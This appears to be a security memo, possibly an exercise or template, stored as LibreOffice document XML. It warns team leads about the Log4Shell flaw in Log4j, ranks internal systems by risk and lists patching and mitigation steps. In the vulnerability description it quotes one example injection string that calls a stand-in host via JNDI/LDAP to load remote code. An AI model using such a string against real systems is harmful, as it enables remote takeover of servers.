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1.0681in"/>
    </style:style>
    <style:style style:name="Table1.B" style:family="table-column">
      <style:table-column-properties style:column-width="1.1347in"/>
    </style:style>
    <style:style style:name="Table1.C" style:family="table-column">
      <style:table-column-properties style:column-width="0.4979in"/>
    </style:style>
    <style:style style:name="Table1.D" style:family="table-column">
      <style:table-column-properties style:column-width="0.8257in"/>
    </style:style>
    <style:style style:name="Table1.E" style:family="table-column">
      <style:table-column-properties style:column-width="0.9069in"/>
    </style:style>
    <style:style style:name="Table1.F" style:family="table-column">
      <style:table-column-properties style:column-width="2.2597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0.7972in"/>
    </style:style>
    <style:style style:name="Table2.B" style:family="table-column">
      <style:table-column-properties style:column-width="1.0465in"/>
    </style:style>
    <style:style style:name="Table2.C" style:family="table-column">
      <style:table-column-properties style:column-width="0.6264in"/>
    </style:style>
    <style:style style:name="Table2.D" style:family="table-column">
      <style:table-column-properties style:column-width="0.9465in"/>
    </style:style>
    <style:style style:name="Table2.E" style:family="table-column">
      <style:table-column-properties style:column-width="1.4792in"/>
    </style:style>
    <style:style style:name="Table2.F" style:family="table-column">
      <style:table-column-properties style:column-width="1.7972in"/>
    </style:style>
    <style:style style:name="Table2.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.0194in" fo:border="none"/>
    </style:style>
    <style:style style:name="P1" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="0009cceb"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Heading_20_3">
      <style:text-properties officeooo:paragraph-rsid="0009cceb"/>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text-properties officeooo:paragraph-rsid="0009cceb"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L3"/>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="0009cceb"/>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O:</text:span> All Infrastructure and Product Team Leads<text:line-break/><text:span text:style-name="Strong_20_Emphasis">FROM:</text:span> [<text:span text:style-name="T1">Ashley Jordan Chihiya, Î</text:span><text:span text:style-name="Strong_20_Emphasis">nformation Security Analyst</text:span> in the Cyber &amp; Information Security Team.]<text:line-break/><text:span text:style-name="Strong_20_Emphasis">DATE:</text:span> [<text:span text:style-name="T1">7 November 2025</text:span>]<text:line-break/><text:span text:style-name="Strong_20_Emphasis">SUBJECT:</text:span> <text:span text:style-name="Strong_20_Emphasis">CRITICAL ACTION REQUIRED: Apache Log4j Zero-Day Vulnerability (CVE-2021-44228</text:span> </text:p>
      <text:p text:style-name="P1"/>
      <text:h text:style-name="P2" text:outline-level="3">. Executive Summary</text:h>
      <text:p text:style-name="Text_20_body">A critical, zero-day vulnerability has been publicly disclosed in the Apache Log4j logging library, a component embedded in countless software applications worldwide. This vulnerability (CVE-2021-44228), also known as "Log4Shell," is being actively exploited by attackers and allows for remote code execution (RCE). This means an attacker can take full control of an affected system with minimal effort.</text:p>
      <text:p text:style-name="Text_20_body">Based on our initial infrastructure analysis, <text:span text:style-name="Strong_20_Emphasis">this vulnerability poses an immediate and severe risk to our organization.</text:span> All teams must treat this with the highest priority.</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">2. Vulnerability Details</text:h>
      <text:list text:style-name="L1">
        <text:list-item>
          <text:p text:style-name="P3"><text:span text:style-name="Strong_20_Emphasis">CVE:</text:span> CVE-2021-44228</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P3"><text:span text:style-name="Strong_20_Emphasis">Severity:</text:span> CRITICAL (CVSS Score: 10.0)</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P3"><text:span text:style-name="Strong_20_Emphasis">Affected Software:</text:span> Apache Log4j versions 2.0-beta9 to 2.14.1</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P3"><text:span text:style-name="Strong_20_Emphasis">Description:</text:span> The vulnerability exists in the way Log4j processes log messages. An attacker can trigger the vulnerability by forcing a server to log a specially crafted string (e.g., <text:span text:style-name="Source_20_Text">${jndi:ldap://malicious-site.com/payload}</text:span>). This can allow the attacker to execute arbitrary code on the server.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Text_20_body">For detailed technical information, please refer to the CISA Advisory: <text:a xlink:type="simple" xlink:href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a" office:target-frame-name="_blank" xlink:show="new" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">AA21-356A</text:a>.</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">3. Immediate Action Required</text:h>
      <text:p text:style-name="Text_20_body">All teams must immediately scan their services and applications to identify any use of the vulnerable Log4j library. The following steps are mandatory:</text:p>
      <text:list text:style-name="L2">
        <text:list-item>
          <text:p text:style-name="P4"><text:span text:style-name="Strong_20_Emphasis">Identify:</text:span> Inventory all services, applications, and dependencies to locate any instance of Log4j (version 2.0-beta9 to 2.14.1).</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P4"><text:span text:style-name="Strong_20_Emphasis">Patch:</text:span> The most effective mitigation is to immediately upgrade Log4j to version <text:span text:style-name="Strong_20_Emphasis">2.17.0 or later</text:span>.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P4"><text:span text:style-name="Strong_20_Emphasis">Mitigate:</text:span> If immediate patching is not possible, implement emergency mitigations as outlined in the CISA advisory, such as:</text:p>
          <text:list>
            <text:list-item>
              <text:p text:style-name="P4">Setting the system property <text:span text:style-name="Source_20_Text">log4j2.formatMsgNoLookups</text:span> to <text:span text:style-name="Source_20_Text">true</text:span>.</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P4">Removing the <text:span text:style-name="Source_20_Text">JndiLookup</text:span> class from the classpath.</text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P4"><text:span text:style-name="Strong_20_Emphasis">Validate:</text:span> After patching or mitigation, validate that the vulnerability is no longer present.</text:p>
        </text:list-item>
      </text:list>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:soft-page-break/>4. Analysis of Provided Infrastructure</text:h>
      <text:p text:style-name="Text_20_body">Our initial review of the provided infrastructure list has identified the following team and system as <text:span text:style-name="Strong_20_Emphasis">CRITICALLY AFFECTED</text:span> and requiring <text:span text:style-name="Strong_20_Emphasis">IMMEDIATE ACTION</text:span>:</text:p>
      <text:p text:style-name="P1"/>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Product Team</text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table1.A1" office:value-type="string">
              <text:p text:style-name="Table_20_Heading">Product Name</text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table1.A1" office:value-type="string">
              <text:p text:style-name="Table_20_Heading">Team Lead</text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table1.A1" office:value-type="string">
              <text:p text:style-name="Table_20_Heading">Contact</text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table1.A1" office:value-type="string">
              <text:p text:style-name="Table_20_Heading">Status</text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table1.A1" office:value-type="string">
              <text:p text:style-name="Table_20_Heading"><text:span text:style-name="Strong_20_Emphasis">Required Action</text:span></text:p>
            </table:table-cell>
          </table:table-row>
        </table:table-header-rows>
        <table:table-row>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="Strong_20_Emphasis">Product Development</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">Product Development Staging Environment</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">John Doe</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">product@email.com</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="Strong_20_Emphasis">CRITICAL</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="Strong_20_Emphasis">IMMEDIATE PATCHING REQUIRED.</text:span> This system has "Log4j" explicitly listed as an installed service, making it highly likely to be vulnerable. The team must identify the exact version and patch it to 2.17.0+ immediately.</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P5">The following teams have services that require <text:span text:style-name="Strong_20_Emphasis">IMMEDIATE VALIDATION</text:span>. While "Apache httpd" itself is not directly vulnerable, many Java-based web applications running <text:span text:style-name="Emphasis">on</text:span> Apache httpd use Log4j for logging and are at high risk.</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office:value-type="string">
              <text:p text:style-name="Table_20_Heading">Product Team</text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A1" office:value-type="string">
              <text:p text:style-name="Table_20_Heading">Product Name</text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A1" office:value-type="string">
              <text:p text:style-name="Table_20_Heading">Team Lead</text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A1" office:value-type="string">
              <text:p text:style-name="Table_20_Heading">Contact</text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A1" office:value-type="string">
              <text:p text:style-name="Table_20_Heading">Status</text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.A1" office:value-type="string">
              <text:p text:style-name="Table_20_Heading"><text:span text:style-name="Strong_20_Emphasis">Required Action</text:span></text:p>
            </table:table-cell>
          </table:table-row>
        </table:table-header-rows>
        <table:table-row>
          <table:table-cell table:style-name="Table2.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">HR</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table2.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">Human Resource Information System</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table2.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">Joe Bloggs</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table2.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">hr@email.com</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table2.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="Strong_20_Emphasis">REQUIRES INVESTIGATION</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table2.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">The presence of "Apache httpd" means any Java-based HR applications hosted on this server must be urgently investigated for vulnerable Log4j dependencies.</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table2.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">IT</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table2.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">Workstation Management System</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table2.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">Jane Doe</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table2.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">tech@email.com</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table2.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="Strong_20_Emphasis">LOW RISK</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table2.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">The listed services (OpenSSH, dnsmasq, lighttpd) are not Java-based and are not directly vulnerable.</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table2.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">Marketing</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table2.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">Marketing Analytics Server</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table2.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">Joe Schmoe</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table2.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">marketing@email.com</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table2.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="Strong_20_Emphasis">LOW RISK</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table2.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">The listed services are primarily Microsoft-based and are not directly vulnerable to this specific Java library flaw.</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="P1"/>
      <text:h text:style-name="P2" text:outline-level="3">5. The Bigger Picture: Ransomware Threat</text:h>
      <text:p text:style-name="Text_20_body">This vulnerability is particularly dangerous in the context of the current cybersecurity landscape. As highlighted in a separate CISA advisory, ransomware groups have become increasingly professionalized and are quick to weaponize new vulnerabilities to gain initial access to corporate networks.</text:p>
      <text:p text:style-name="Text_20_body"><text:soft-page-break/>A failure to patch this Log4j vulnerability swiftly could provide a direct entry point for ransomware actors, leading to catastrophic business disruption, financial loss, and data theft. The urgency of this patch cycle cannot be overstated.</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">6. Conclusion and Contact</text:h>
      <text:p text:style-name="Text_20_body">This is an all-hands-on-deck situation. The security of our company depends on a swift and thorough response.</text:p>
      <text:p text:style-name="Text_20_body">The <text:span text:style-name="Strong_20_Emphasis">Product Development team, led by John Doe, is on critical path for this emergency.</text:span> The HR team must also conduct immediate validation of their web applications.</text:p>
      <text:p text:style-name="Text_20_body">All teams must report their findings and remediation status to [Central Security Email/Portal] by [Specify Deadline, e.g., 24 hours from now].</text:p>
      <text:p text:style-name="Text_20_body">For technical assistance, please contact the Security Operations Center.</text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="Strong_20_Emphasis">Reference:</text:span></text:p>
      <text:list text:style-name="L3">
        <text:list-item>
          <text:p text:style-name="P6">CISA Apache Log4j Advisory: <text:a xlink:type="simple" xlink:href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a" office:target-frame-name="_blank" xlink:show="new" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">AA21-356A</text:a></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P6">CISA/FBI/NSA Ransomware Trends Advisory: <text:a xlink:type="simple" xlink:href="https://www.cisa.gov/news-events/news/cisa-fbi-nsa-and-international-partners-issue-advisory-ransomware-trends-2021" office:target-frame-name="_blank" xlink:show="new" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://www.cisa.gov/news-events/news/cisa-fbi-nsa-and-international-partners-issue-advisory-ransomware-trends-2021</text:a></text:p>
        </text:list-item>
      </text:list>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7T08:31:02.397340000</meta:creation-date>
    <meta:generator>LibreOffice/25.8.2.2$Windows_X86_64 LibreOffice_project/d401f2107ccab8f924a8e2df40f573aab7605b6f</meta:generator>
    <dc:date>2025-11-07T08:35:12.163377500</dc:date>
    <meta:editing-duration>PT4M10S</meta:editing-duration>
    <meta:editing-cycles>1</meta:editing-cycles>
    <meta:document-statistic meta:table-count="2" meta:image-count="0" meta:object-count="0" meta:page-count="3" meta:paragraph-count="68" meta:word-count="682" meta:character-count="4833" meta:non-whitespace-character-count="4230"/>
  </office:meta>
</office:document-meta>
</file>